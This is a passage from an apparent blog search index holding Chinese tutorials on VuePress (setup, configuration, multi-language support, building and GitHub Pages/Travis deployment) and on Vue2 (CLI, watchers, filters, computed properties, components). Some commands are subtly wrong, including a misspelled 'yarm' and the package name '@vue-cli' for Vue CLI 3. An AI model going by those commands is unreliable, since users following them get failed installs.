Vue、Vue Router 和 Webpack 驱动的单页应用。如果你以前使用过 Vue 的话，当你在开发一个自定义主题的时候，你会感受到非常熟悉的开发体验，你甚至可以使用 Vue DevTools 去调试你的自定义主题。在构建时，我们会为应用创建一个服务端渲染（SSR）的版本，然后通过虚拟访问每一条路径来渲染对应的 HTML。这种做法的灵感来源于 Nuxt 的 nuxt generate 命令，以及其他的一些项目，比如 Gatsby。 功能说明内置的 Markdown 拓展 目录 自定义容器 代码块中的行高亮 行号 导入代码段 在 Markdown 中 使用 Vue 模板语法 使用组件 Vue 驱动的自定义主题系统 网站和页面的元数据 内容摘抄 默认主题 Responsive layout 首页 内置的搜索 Algolia 搜索 可定制的 navbar and sidebar 自动生成的 GitHub 链接和页面编辑链接 PWA: 刷新内容的 Popup 最后更新时间 多语言支持 博客主题 文档 在线案例 Plugin 强大的 Plugin API 博客插件 PWA 插件 Google Analytics 插件 … VuePress 快速入门 Warning 前提条件：VuePress 需要 Node.js &gt;= 8.6 下述内容会帮助你从头搭建一个简单的 VuePress 文档，如果你想在一个现有的项目中使用 VuePress 来管理文档，从步骤 3 开始。 创建并进入一个新目录 1$ mkdir vuepress-starter &amp;&amp; cd vuepress-starter 使用你喜欢的包管理器进行初始化 1234$ yarn init# 或者$ npm init 将 VuePress 安装为本地依赖 1234$ yarn add -D vuepress# 或者$ npm install -D vuepress # npm install vuepress --save-dev Warning 注意：官方已经不再推荐全局安装 VuePress，如果你的现有项目依赖了 Webpack 3.x，则推荐使用 Yarn 而不是 NPM 来安装 VuePress。因为在这种情形下，NPM 会生成错误的依赖树 创建第一篇文档 1$ mkdir docs &amp;&amp; echo \'# Hello VuePress\' &gt; docs/README.md 在 package.json 中添加一些 scripts 这一步骤是可选的，但推荐你完成它。在下文中，会默认这些 scripts 已经被添加。 123456{ "scripts": { "docs:dev": "vuepress dev docs", "docs:build": "vuepress build docs" }} 在本地启动服务器 1234$ yarn docs:dev# 或者$ npm run docs:dev VuePress 会在 http://127.0.0.1:8080 启动一个热重载的开发服务器，此时你就拥有了一个简单可用的 VuePress 文档。当你的文档逐渐成型的时候，不要忘记 VuePress 的 多语言支持 ，并了解一下如何将你的文档 部署 到任意静态文件服务器上。 目录结构说明 如果 docs 目录做为顶级目录（非 vuepress-starter 的子目录），如下所示： 123456.├─ docs│ ├─ README.md│ └─ .vuepress│ └─ config.js└─ package.json 那么 package.json 的配置内容需要更改为： 123456{ "scripts": { "build": "vuepress build .", "dev": "vuepress dev ." }} Shell 脚本的内容则更改为： 1234$ yarn dev# 或者$ npm run dev VuePress 基础概念目录结构VuePress 遵循 “约定优于配置” 的原则，推荐的目录结构如下： 12345678910111213141516171819202122.├── docs│&nbsp;&nbsp; ├── .vuepress _(**可选的**)_│&nbsp;&nbsp; │&nbsp;&nbsp; ├── `components` _(**可选的**)_│&nbsp;&nbsp; │&nbsp;&nbsp; ├── `theme` _(**可选的**)_│&nbsp;&nbsp; │&nbsp;&nbsp; │ └── Layout.vue│&nbsp;&nbsp; │&nbsp;&nbsp; ├── `public` _(**可选的**)_│&nbsp;&nbsp; │&nbsp;&nbsp; ├── `styles` _(**可选的**)_│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── index.styl│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── palette.styl│&nbsp;&nbsp; │&nbsp;&nbsp; ├── `templates` _(**可选的, 谨慎配置**)_│&nbsp;&nbsp; │&nbsp;&nbsp; │ &nbsp; ├── dev.html│&nbsp;&nbsp; │&nbsp;&nbsp; │ &nbsp; └── ssr.html│&nbsp;&nbsp; │&nbsp;&nbsp; ├── `config.js` _(**可选的**)_│&nbsp;&nbsp; │&nbsp;&nbsp; └── `enhanceApp.js` _(**可选的**)_│&nbsp;&nbsp; │&nbsp;│&nbsp;&nbsp; ├── README.md│&nbsp;&nbsp; ├── guide│&nbsp;&nbsp; │&nbsp;&nbsp; └── README.md│&nbsp;&nbsp; └── config.md│&nbsp;└── package.json Warning 注意：请留意目录名的大写 docs/.vuepress: 用于存放全局的配置、组件、静态资源等。 docs/.vuepress/components: 该目录中的 Vue 组件将会被自动注册为全局组件。 docs/.vuepress/theme: 用于存放本地主题。 docs/.vuepress/styles: 用于存放样式相关的文件。 docs/.vuepress/styles/index.styl: 将会被自动应用的全局样式文件，会生成在最终的 CSS 文件结尾，具有比默认样式更高的优先级。 docs/.vuepress/styles/palette.styl: 用于重写默认颜色常量，或者设置新的 stylus 颜色常量。 docs/.vuepress/public: 静态资源目录。 docs/.vuepress/templates: 存储 HTML 模板文件。 docs/.vuepress/templates/dev.html: 用于开发环境的 HTML 模板文件。 docs/.vuepress/templates/ssr.html: 构建时基于 Vue SSR 的 HTML 模板文件。 docs/.vuepress/config.js: 配置文件的入口文件，也可以是 YML 或 toml。 docs/.vuepress/enhanceApp.js: 客户端应用的增强。 Warning 注意：当你想要去自定义 templates/ssr.html 或 templates/dev.html 时，最好基于 默认的模板文件 来修改，否则可能会导致构建出错 页面路由此处一般把 docs 目录作为 targetDir （参考 命令行接口），下面所有的 “文件的相对路径” 都是相对于 docs 目录的。在项目根目录下的 package.json 中添加如下 scripts ： 123456{ "scripts": { "dev": "vuepress dev docs", "build": "vuepress build docs" }} 对于上述的目录结构，Vuepress 的默认页面路由地址如下： 文件的相对路径 页面路由地址 /README.md / /guide/README.md /guide/ /config.md /config.html 基本配置配置文件如果没有任何配置，这个网站将会是非常局限的，用户也无法在你的网站上自由导航。为了更好地自定义你的网站，首先需要在你的文档目录下创建一个 .vuepress 目录，所有 VuePress 相关的文件都将会被放在这里，项目结构示例如下： 123456.├─ docs│ ├─ README.md│ └─ .vuepress│ └─ config.js└─ package.json 一个 VuePress 网站最必要的配置文件是 .vuepress/config.js，它应该导出一个 JavaScript 对象： 1234module.exports = { title: \'Hello VuePress\', description: \'Just playing around\'} 对于上述的配置，如果你运行起 dev server，你应该能看到一个页面，它包含一个页头，里面包含一个标题和一个搜索框。VuePress 内置了基于 headers 的搜索 —— 它会自动为所有页面的标题、h2 和 h3 构建起一个简单的搜索索引。可参见 配置 来查看所有可配置的选项。 Tip 其他配置格式：你也可以使用 YAML (.vuepress/config.yml) 或是 TOML (.vuepress/config.toml) 格式的配置文件 主题配置一个 VuePress 主题应该负责整个网站的布局和交互细节。在 VuePress 中，目前自带了一个默认的主题（正是你现在所看到的），它是为技术文档而设计的。同时，默认主题提供了一些选项，让你可以去自定义导航栏（navbar）、 侧边栏（sidebar）和 首页（homepage） 等，详情请参见 默认主题配置 ，如果你想开发一个自定义主题，可以参考 自定义主题。 应用级别的配置由于 VuePress 是一个标准的 Vue 应用，你可以通过创建一个 .vuepress/enhanceApp.js 文件来做一些应用级别的配置，当该文件存在的时候，会被导入到应用内部。enhanceApp.js 应该 export default 一个钩子函数，并接受一个包含了一些应用级别属性的对象作为参数。你可以使用这个钩子来安装一些附加的 Vue 插件、注册全局组件，或者增加额外的路由钩子等： 12345678910// 使用异步函数也是可以的export default ({ Vue, // VuePress 正在使用的 Vue 构造函数 options, // 附加到根实例的一些选项 router, // 当前应用的路由实例 siteData, // 站点元数据 isServer // 当前应用配置是处于 服务端渲染 或 客户端}) =&gt; { // ...做一些其他的应用级别的优化} 静态资源相对路径所有的 Markdown 文件都会被 Webpack 编译成 Vue 组件，因此你可以，并且应该更倾向于使用相对路径（Relative URLs）来引用所有的静态资源： 1![An image](./image.png) 同样地，这在 *.vue 文件的模板中一样可以工作，图片将会被 url-loader 和 file-loader 处理，在运行生成静态文件的构建任务时，文件会被复制到正确的位置。 除此之外，你也使用 ~ 前缀来明确地指出这是一个 Webpack 的模块请求，这将允许你通过 Webpack 别名来引用文件或者 NPM 的依赖： 12![Image from alias](~@alias/image.png)![Image from dependency](~some-dependency/image.png) Webpack 的别名可以通过 .vuepress/config.js 中 configureWebpack 来配置，如： 123456789module.exports = { configureWebpack: { resolve: { alias: { \'@alias\': \'path/to/some/dir\' } } }} 公共文件有时，你可能需要提供一个静态资源，但是它们并不直接被你的任何一个 Markdown 文件或者主题组件引用 —— 举例来说，favicons 和 PWA 的图标，在这种情形下，你可以将它们放在 .vuepress/public 中， 它们最终会被复制到生成的静态文件夹中。 基础路径如果你的网站会被部署到一个非根路径，你将需要在 .vuepress/config.js 中设置 base，举例来说，如果你打算将你的网站部署到 https://foo.github.io/bar/，那么 base 的值就应该被设置为 "/bar/" (应当总是以斜杠开始，并以斜杠结束)。有了基础路径（Base URL），如果你希望引用一张放在 .vuepress/public 中的图片，你需要使用这样路径：/bar/image.png，然而，一旦某一天你决定去修改 base，这样的路径引用将会显得异常脆弱。为了解决这个问题，VuePress 提供了内置的一个 helper $withBase（它被注入到了 Vue 的原型上），可以帮助你生成正确的路径： 1&lt;img :src="$withBase(\'/foo.png\')" alt="foo"&gt; 值得一提的是，你不仅可以在你的 Vue 组件中使用上述的语法，在 Markdown 文件中亦是如此。最后补充一句，一个 base 路径一旦被设置，它将会自动地作为前缀插入到 .vuepress/config.js 中所有以 / 开始的资源路径中。 多语言支持站点多语言配置要启用 VuePress 的多语言支持，首先需要使用如下的文件结构： 12345678910docs├─ README.md├─ foo.md├─ nested│&nbsp;&nbsp;└─ README.md└─ zh ├─ README.md ├─ foo.md └─ nested &nbsp;&nbsp; └─ README.md 然后，在 .vuepress/config.js 中提供 locales 选项： 12345678910111213141516module.exports = { locales: { // 键名是该语言所属的子路径 // 作为特例，默认语言可以使用 \'/\' 作为其路径。 \'/\': { lang: \'en-US\', // 将会被设置为 &lt;html&gt; 的 lang 属性 title: \'VuePress\', description: \'Vue-powered Static Site Generator\' }, \'/zh/\': { lang: \'zh-CN\', title: \'VuePress\', description: \'Vue 驱动的静态网站生成器\' } }} 如果一个语言没有声明 title 或者 description，VuePress 将会尝试使用配置顶层的对应值。如果每个语言都声明了 title 和 description，则顶层的这两个值可以被省略。 默认主题多语言配置默认主题也内置了多语言支持，可以通过 themeConfig.locales 来配置。该选项接受同样的 { path: config } 格式的值。每个语言除了可以配置一些站点中用到的文字之外，还可以拥有自己的 导航栏 和 侧边栏 配置： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647module.exports = { locales: { \'/\': { lang: \'en-US\', title: \'VuePress\', description: \'Vue-powered Static Site Generator\' }, \'/zh/\': { lang: \'zh-CN\', title: \'VuePress\', description: \'Vue 驱动的静态网站生成器\' } }, themeConfig: { locales: { \'/\': { selectText: \'Languages\', label: \'English\', ariaLabel: \'Languages\', editLinkText: \'Edit this page on GitHub\', algolia: {}, nav: [ {text: \'Nested\', link: \'/nested/\', ariaLabel: \'Nested\'} ], sidebar: { \'/nested/\': [/* ... */] } }, \'/zh/\': { // 多语言下拉菜单的标题 selectText: \'选择语言\', // 该语言在下拉菜单中的标签 label: \'简体中文\', // 编辑链接文字 editLinkText: \'在 GitHub 上编辑此页\', // 当前 locale 的 algolia docsearch 选项 algolia: {}, nav: [ {text: \'嵌套\', link: \'/zh/nested/\'} ], sidebar: { \'/zh/nested/\': [/* ... */] } } } }} 编译构建 在 config.js 中指定构建的目标目录： 123module.exports = { dest: \'docs/.vuepress/dist\'} 通过以下命令编译构建，生成 VuePress 网站所需的静态文件，这样就可以很方便地将 VuePress 文档部署到任意的 Web 服务器 123456789101112131415161718192021# 编译构建$ yarm docs:build# 或者$ npm run docs:build# 成功编译后，会在指定的目录下生成网站的所有静态文件，目录结构如下docs/.vuepress/dist├── 404.html├── assets├── contact├── debug├── en├── faq├── favicon.ico├── guide├── hero.png├── index.html├── logo.png├── manifest.json└── service-worker.js 目录结构说明 如果 docs 目录做为顶级目录，如下所示： 123456.├─ docs│ ├─ README.md│ └─ .vuepress│ └─ config.js└─ package.json 那么 config.js 的配置内容需要更改为： 123module.exports = { dest: \'.vuepress/dist\'} 编译构建的命令则更改为： 1234$ yarn build# 或者$ npm run build 部署方式GitHub Pages 在 docs/.vuepress/config.js 中设置正确的 base 如果你打算发布到 https://&lt;USERNAME&gt;.github.io/，则可以省略这一步，因为 base 默认即是 "/"。 如果你打算发布到 https://&lt;USERNAME&gt;.github.io/&lt;REPO&gt;/（也就是说你的仓库在 https://github.com/&lt;USERNAME&gt;/&lt;REPO&gt;），则将 base 设置为 "/&lt;REPO&gt;/"。 在你的项目中，创建一个如下的 deploy.sh 文件（请自行判断去掉对应的注释） 12345678910111213141516171819202122232425#!/usr/bin/env sh# 确保脚本抛出遇到的错误set -e# 生成静态文件npm run docs:build# 进入生成的文件夹cd docs/.vuepress/dist# 如果是发布到自定义域名# echo \'www.example.com\' &gt; CNAMEgit initgit add -Agit commit -m \'deploy\'# 如果发布到 https://&lt;USERNAME&gt;.github.io## git push -f git@github.com:&lt;USERNAME&gt;/&lt;USERNAME&gt;.github.io.git master# 如果发布到 https://&lt;USERNAME&gt;.github.io/&lt;REPO&gt;## git push -f git@github.com:&lt;USERNAME&gt;/&lt;REPO&gt;.git master:gh-pagescd - 你可以在你的持续集成的设置中，设置在每次 Push 代码时自动运行上述 Shell 脚本 GitHub Pages and Travis CI 在 docs/.vuepress/config.js 中设置正确的 base 如果你打算发布到 https://&lt;USERNAME or GROUP&gt;.github.io/，则可以省略这一步，因为 base 默认即是 "/"。 如果你打算发布到 https://&lt;USERNAME or GROUP&gt;.github.io/&lt;REPO&gt;/（也就是说你的仓库在 https://github.com/&lt;USERNAME&gt;/&lt;REPO&gt;），则将 base 设置为 "/&lt;REPO&gt;/"。 在项目的根目录创建一个名为 .travis.yml 的文件 在本地执行 yarn 或 npm install 并且提交生成的 lock 文件（即 yarn.lock 或 package-lock.json） 使用 GitHub Pages 部署提供程序模板，并遵循 Travis 文档规范 来编写 .travis.yml 文件 123456789101112131415language: node_jsnode_js: - lts/*install: - yarn install # npm ciscript: - yarn docs:build # npm run docs:builddeploy: provider: pages skip_cleanup: true local_dir: docs/.vuepress/dist github_token: $GITHUB_TOKEN # 在 GitHub 中生成，用于允许 Travis 向你的仓库推送代码。在 Travis 的项目设置页面进行配置，设置为 secure variable keep_history: true on: branch: master var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"静态博客"},{title:"初探前端框架 Vue2 之四",url:"/posts/9f128424.html",text:'大纲 初探前端框架 Vue2 之一 初探前端框架 Vue2 之二 初探前端框架 Vue2 之三 初探前端框架 Vue2 之四 Vue CLI 安装CLI 是 Command-Line Interface (命令行界面) 的缩写，俗称脚手架。Vue CLI 是一个由 Vue 官方提供的、快速生成 Vue 工程化项目的工具，可以快速搭建 Vue 开发环境以及创建对应的 Webpack 配置文件。在使用 Vue 开发大型应用时，往往需要考虑代码目录结构、项目结构和部署、热加载、单元测试等事情；如果每个项目都要手动完成这些工作，那无以效率比较低效，所以通常会使用一些脚手架工具来帮助完成这些事情。 版本区别Vue CLI 目前拥有两个版本，分别是 Vue CLI 2 和 Vue CLI 3，两者的区别如下： Vue CLI 3 提供了 vue ui 命令，提供了可视化配置，更加人性化 Vue CLI 3 是基于 Webpack 4 打造，Vue CLI 2 是基于 Webpack 3 打造 Vue CLI 3 的设计原则是 零配置，移除了配置文件根目录下的 build 和 config 等目录 Vue CLI 3 移除了 static 文件夹，新增了 public 文件夹，并且将 index.html 移动到 public 文件夹中 Vue CLI 2 安装12# 全局安装 Vue CLI 2$ npm install vue-cli -g Vue CLI 3 安装12# 全局安装 Vue CLI 3$ npm install @vue-cli -g 由于 Vue CLI 3 和 Vue CLI 2 使用了相同的 vue 命令，若之前安装过 Vue CLI 2，那么 Vue CLI 2 的命令会被覆盖掉。如果安装了 Vue CLI 3 后，仍然需要使用 Vue CLI 2 的 vue init 功能，可以全局安装一个桥接工具，命令如下： 12345# 全局安装桥接工具$ npm install -g @vue/cli-init# 桥接工具安装完成后，`vue init` 命令的运行效果将会跟 `vue-cli@2.x` 的命令相同$ vue init webpack my-project Vue 模块化开发在企业项目开发中，往往是使用脚手架进行模块化开发，因此需要提前安装好 Vue CLI 脚手架。 创建 Vue 项目初始化项目Vue CLI 脚手架使用 webpack 模板初始化一个名为 vue-demo 的 Vue 项目，命令如下： 1$ vue init webpack vue-demo 项目结构 构建项目 启动项目 1$ npm run dev 项目启动后，浏览器打开 http://localhost:8080 即可以访问项目。 打包项目 1$ npm run build Vue 单文件组件Vue 单文件组件由三个部分组成： Template：HTML 模板 Script:vue：Vue 实例配置 Style：CSS 样式 12345678910111213141516171819202122&lt;template&gt; &lt;div class="hello"&gt; &lt;h1&gt;{{ msg }}&lt;/h1&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default { name: "HelloWorld", data() { return { msg: "Welcome to Your Vue.js App", }; },};&lt;/script&gt;&lt;style scoped&gt;h1, h2 { font-weight: normal;}&lt;/style&gt; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端"},{title:"初探前端框架 Vue2 之三",url:"/posts/b6dfff10.html",text:'大纲 初探前端框架 Vue2 之一 初探前端框架 Vue2 之二 初探前端框架 Vue2 之三 初探前端框架 Vue2 之四 监听器（watch）监听器介绍watch 属性可以监听一个值的变化，从而做出相应的反应（渲染）。 监听器使用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;ul&gt; &lt;li&gt;西游记：价格 {{xyjPrice}}，数量： &lt;input type="number" v-model="xyjNum"&gt; &lt;/li&gt; &lt;li&gt;水浒传：价格 {{shzPrice}}，数量： &lt;input type="number" v-model="shzNum"&gt; &lt;/li&gt; &lt;li&gt;提示信息：{{msg}}&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { xyjPrice: 56, shzPrice: 47, xyjNum: 1, shzNum: 1, msg: \'\' }, watch: { // 监听 xyjNum 值的变化 xyjNum(newVal, oldVal) { if (newVal &gt;= 3) { this.msg = \'库存不足\'; this.xyjNum = 3; } else { this.msg = \'\'; } } } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码运行效果 上述 HTML 代码的运行效果如下，当输入的西游记下单数量大于等于 3 时，页面会显示 库存不足 的提示信息。 过滤器（filters）过滤器介绍过滤器不会改变真正的 data，而只是改变渲染的结果，并返回过滤后的内容。在很多不同的业务场景下，过滤器都是有用的，比如尽可能保持 API 响应结果的干净，并在前端处理数据的格式。 提示 过滤器常用来处理文本格式化的操作 过滤器可以用在两个地方：双花括号插值 {{ }} 和 v-bind 指令中 过滤器使用局部过滤器使用局部过滤器注册在当前的 Vue 实例中，只有当前 Vue 实例可以使用。| 管道符号，表示使用后面的过滤器处理前面的数据。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;table border="1px" cellspacing="0" width="200px"&gt; &lt;tr align="center"&gt; &lt;th&gt;ID&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;性别&lt;/th&gt; &lt;/tr&gt; &lt;tr align="center" v-for="user in userList"&gt; &lt;td&gt;{{user.id}}&lt;/td&gt; &lt;td&gt;{{user.name}}&lt;/td&gt; &lt;!-- 使用性别过滤器 --&gt; &lt;td&gt;{{user.gender | genderFilters}}&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { userList: [ { id: 1, name: \'Jack\', gender: 1 }, { id: 2, name: \'Amy\', gender: 0 } ] }, filters: { // 注册性别过滤器 genderFilters(val) { if (val === 1) { return "男"; } else { return "女"; } } } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码运行效果 上述 HTML 代码的运行效果如下，当使用局部定义的性别过滤器后，页面渲染后会显示过滤后得到的性别。 全局过滤器使用全局过滤器注册在全局，可以在当前 Vue 实例之外使用。| 管道符号，表示使用后面的过滤器处理前面的数据。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body style="margin: 100px;"&gt; &lt;div id="app"&gt; &lt;table border="1px" cellspacing="0" width="200px"&gt; &lt;tr align="center"&gt; &lt;th&gt;ID&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;性别&lt;/th&gt; &lt;/tr&gt; &lt;tr align="center" v-for="user in userList"&gt; &lt;td&gt;{{user.id}}&lt;/td&gt; &lt;td&gt;{{user.name}}&lt;/td&gt; &lt;!-- 使用性别过滤器 --&gt; &lt;td&gt;{{user.gender | genderFilters}}&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; // 在创建 Vue 实例之前注册全局过滤器 Vue.filter(\'genderFilters\', function (val) { if (val === 1) { return "男"; } else { return "女"; } }); let app = new Vue({ el: "#app", data: { userList: [ { id: 1, name: \'Jack\', gender: 1 }, { id: 2, name: \'Amy\', gender: 0 } ] } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码运行效果 上述 HTML 代码的运行效果如下，当使用全局定义的性别过滤器后，页面渲染后会显示过滤后得到的性别。 计算属性（computed）计算属性介绍若某些渲染结果是基于已有数据实时计算出来的，那么可以利用 Vue 的计算属性（computed）来实现。 计算属性使用123456789101112131415161718192021222324252627282930313233343536373839404142&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;ul&gt; &lt;li&gt;西游记：价格 {{xyjPrice}}，数量： &lt;input type="number" v-model="xyjNum"&gt; &lt;/li&gt; &lt;li&gt;水浒传：价格 {{shzPrice}}，数量： &lt;input type="number" v-model="shzNum"&gt; &lt;/li&gt; &lt;li&gt;总价：{{totalPrice}}&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { xyjPrice: 56, shzPrice: 47, xyjNum: 1, shzNum: 1 }, computed: { // 实时计算 totalPrice totalPrice() { return this.xyjPrice * this.xyjNum + this.shzPrice * this.shzNum; } } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码运行效果 上述 HTML 代码的运行效果如下，只要 totalPrice 依赖的属性发生了变化，就会重新计算 totalPrice 的值。 组件化在大型应用开发的时候，页面可以划分成很多部分。往往不同的页面，也会有相同的部分，例如可能会有相同的头部导航。但是如果每个页面都独自开发，这无疑增加了开发的成本。所以一般会把页面的不同部分拆分成独立的组件，然后在不同页面就可以共享这些组件，避免重复开发。在 Vue 里，所有的 Vue 实例都是组件，通常一个应用会以一棵嵌套的组件树的形式来组织（如下图）。例如，可能会有页头、侧边栏、内容区等组件，每个组件又包含了其它的像导航链接、博文之类的组件。 全局组件通过 Vue 的 component() 函数可以定义一个全局组件，component() 函数的第一个参数是组件名称，第二个参数是组件的参数。 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;!-- 使用已定义的全局组件 --&gt; &lt;counter&gt;&lt;/counter&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; // 在创建 Vue 实例之前，全局注册一个组件 Vue.component("counter", { template: `&lt;button v-on:click="count++"&gt;点击了 {{count}} 次&lt;/button&gt;`, data() { return { count: 1 } } }); let app = new Vue({ el: "#app" }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码运行效果 上述 HTML 代码的运行效果如下，每点击一次按钮，都会记录显示点击的总次数。 组件其实也是一个 Vue 实例，因此它在定义时也会接收 data、methods、生命周期函数等 与普通 Vue 实例不同的是，组件不会与页面的元素绑定，否则就无法复用了，因此没有 el 属性 由于组件渲染需要 HTML 模板，所以增加了 template 属性，值就是 HTML 模板的内容 全局组件定义完成后，任何 Vue 实例都可以直接在 HTML 中通过组件名称来使用组件 data 必须是一个函数，不再是一个对象，因此每个实例可以维护一份被返回对象的独立的拷贝。否则重复引用同一个组件时，数据会互相影响 局部组件通过 Vue 的 components 属性可以定义一个局部组件，components 就是当前 Vue 实例子组件的集合。特别注意，局部组件只能在当前 Vue 实例中使用。 12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;!-- 使用已定义的局部组件 --&gt; &lt;counter&gt;&lt;/counter&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", components: { // 注册局部组件 \'counter\': { template: `&lt;button v-on:click="count++"&gt;点击了 {{count}} 次&lt;/button&gt;`, data() { return { count: 1 } } } } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码运行效果 上述 HTML 代码的运行效果如下，每点击一次按钮，都会记录显示点击的总次数。 组件复用定义好全局组件或局部组件后，在同一个 Vue 实例（页面）中可以任意重复使用多次。 特别注意 注册全局组件或局部组件时，data 必须是一个函数，不再是一个对象，因此每个实例可以维护一份被返回对象的独立的拷贝。否则重复引用同一个组件时，数据会互相影响。 1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;!-- 重复使用已定义的全局组件 --&gt; &lt;counter&gt;&lt;/counter&gt; &lt;counter&gt;&lt;/counter&gt; &lt;counter&gt;&lt;/counter&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; // 在创建 Vue 实例之前，全局注册一个组件 Vue.component("counter", { template: `&lt;button v-on:click="count++"&gt;点击了 {{count}} 次&lt;/button&gt;`, data() { return { count: 1 } } }); let app = new Vue({ el: "#app" }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 生命周期和钩子函数每个 Vue 实例在被创建时都要经过一系列的初始化过程：创建实例，装载模板，渲染模板等等。Vue 为生命周期中的每个状态都设置了钩子函数（监听函数）。每当 Vue 实例处于不同的生命周期时，对应的钩子函数就会被触发调用。 生命周期生命周期图示下图展示了 Vue 实例的生命周期。开发者不需要立马弄明白所有的东西，不过随着不断学习和使用，它的参考价值会越来越高。 钩子函数钩子函数介绍 beforeCreated：在使用 Vue 时都要进行实例化，因此该函数就是在 Vue 